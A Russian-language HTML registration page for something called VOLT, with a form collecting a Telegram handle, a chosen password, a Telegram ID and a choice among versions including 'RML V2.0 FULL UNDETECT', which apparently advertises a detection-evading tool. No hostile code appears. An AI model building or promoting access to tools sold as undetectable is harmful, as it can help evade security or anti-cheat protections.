<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VOLT</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <h1>VOLT</h1>

    <form id="surveyForm">
        <div class="form-group">
            <label for="firstName">Логин, @ TG:<span class="required-star">*</span></label>
            <input type="text" id="firstName" name="firstName" required>
        </div>

        <div class="form-group">
            <label for="lastName">Придумай пароль:<span class="required-star">*</span></label>
            <input type="text" id="lastName" name="lastName" required>
        </div>

        <div class="form-group">
            <label for="birthDate">Дата регистрации:<span class="required-star">*</span></label>
            <input type="date" id="birthDate" name="birthDate" required>
        </div>

        <div class="form-group">
            <label for="version">Выбор версии:<span class="required-star">*</span></label>
            <select id="version" name="version" required>
                <option value="" disabled selected>Выберите версию</option>
                <option value="RML V1.0">RML V1.0</option>
                <option value="GHOST V1.0">GHOST V1.0</option>
                <option value="RML V2.0">RML V2.0 FULL UNDETECT</option>
            </select>
            <span id="versionError" class="error-message"></span>
        </div>

        <div class="form-group">
            <label for="notes">Примечание:</label>
            <textarea id="notes" name="notes" rows="4"></textarea>
        </div>

        <div class="form-group">
            <label for="telegramId">Ваш TGID: <a>@voltid_bot</a><span class="required-star">*</span></label>
            <input type="text" id="telegramId" name="telegramId" required placeholder="Ваш Telegram ID">
        </div>

        <button type="submit">Отправить</button>
    </form>

    <div id="popup" class="popup">
        <div class="popup-content">
            <span class="close-btn">&times;</span>
            <h2>Успех!</h2>
            <p>Ваша REG отправлена.</p>
            <button id="continueButton" type="button">Продолжить</button>
        </div>
    </div>

    <div id="codePopup" class="popup">
        <div class="popup-content">
            <span class="close-btn" id="codePopupClose">&times;</span>
            <h2>Введите код</h2>
            <p>Код был отправлен вам в Telegram.</p>
            <div class="form-group">
                <label for="code">Код:<span class="required-star">*</span></label>
                <input type="text" id="code" name="code" required>
                <span id="codeError" class="error-message"></span>
            </div>
            <button id="submitCodeButton" type="button">Подтвердить</button>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
